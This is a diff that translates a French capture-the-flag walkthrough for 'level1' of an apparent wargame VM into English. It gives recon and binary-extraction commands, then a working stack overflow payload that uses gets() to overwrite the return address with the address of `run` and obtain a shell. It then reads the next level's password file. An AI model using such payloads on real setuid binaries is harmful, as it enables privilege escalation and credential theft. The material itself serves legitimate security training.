@@ -1,18 +1,18 @@
-# Level1 — Commandes
+# Level1 — Commands
 
-## Connexion
+## Connection
 
 ```bash
 ssh level1@localhost -p 4242
 ```
 
-Mot de passe : (récupéré en level0, dans `level0/flag`)
+Password: (retrieved in level0, in `level0/flag`)
 
 ---
 
 ## Recon
 
-### Étape 1 — Environnement et binaire
+### Step 1 — Environment and binary
 
 ```bash
 pwd
@@ -21,18 +21,18 @@ file level1
 readelf -h level1
 ```
 
-**But :** Vérifier le home, le binaire setuid level2, type ELF et architecture.
+**Goal:** Check the home, the setuid level2 binary, ELF type and architecture.
 
-### Étape 2 — Extraction pour analyse locale
+### Step 2 — Binary extraction for local analysis
 
-Depuis l’hôte :
+From the host:
 
 ```bash
 cd level1
 sshpass -p '<level1_password>' scp -o StrictHostKeyChecking=no -P 4242 level1@localhost:level1 ./level1.bin
 ```
 
-### Étape 3 — Analyse locale
+### Step 3 — Local analysis
 
 ```bash
 file level1.bin
@@ -42,44 +42,44 @@ objdump -d level1.bin
 objdump -s -j .rodata level1.bin
 ```
 
-**Résultats :** Voir `analysis.md`.
+**Results:** See `analysis.md`.
 
 ---
 
 ## Exploitation
 
-### Étape 4 — Overflow : écraser l’adresse de retour par `run`
+### Step 4 — Overflow: overwrite the return address with `run`
 
-Sur la VM, en level1. **Garder stdin ouvert** pour que le shell reste actif (sinon le pipe se ferme et le shell quitte) :
+On the VM, as level1. **Keep stdin open** so the shell stays active (otherwise the pipe closes and the shell exits):
 
 ```bash
 ( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1
 ```
 
-Tu dois voir "Good... Wait what?" puis un shell. Taper ensuite par exemple `id` puis `cat /home/user/level2/.pass`.
+You should see "Good... Wait what?" then a shell. Then type e.g. `id` then `cat /home/user/level2/.pass`.
 
-Si rien ne s’affiche, tester un autre offset (72 ou 80) à la place de 76 :
+If nothing appears, try another offset (72 or 80) instead of 76:
 
 ```bash
 ( python -c 'print "A"*72 + "\x44\x84\x04\x08"'; cat ) | ./level1
 ```
 
-**But :** `gets()` lit sans limite. L’offset exact jusqu’à l’adresse de retour peut varier (68 d’après le binaire local, 76 souvent sur la VM). Remplacer par l’adresse de `run` (0x08048444) pour appeler `system("/bin/sh")`. On la remplace par l’adresse de `run` (0x08048444) qui appelle `system("/bin/sh")`.
+**Goal:** `gets()` reads without a bound. The exact offset to the return address may vary (68 from the local binary, often 76 on the VM). Replace with the address of `run` (0x08048444) to call `system("/bin/sh")`.
 
-### Étape 5 — Récupération du mot de passe level2
+### Step 5 — Retrieve the level2 password
 
-Dans le shell level2 obtenu :
+In the obtained level2 shell:
 
 ```bash
 id
 cat /home/user/level2/.pass
 ```
 
-### Étape 6 — Connexion level2
+### Step 6 — Connect as level2
 
 ```bash
 exit
 ssh level2@localhost -p 4242
 ```
 
-Consigner le mot de passe dans `level1/flag`.
+Record the password in `level1/flag`.
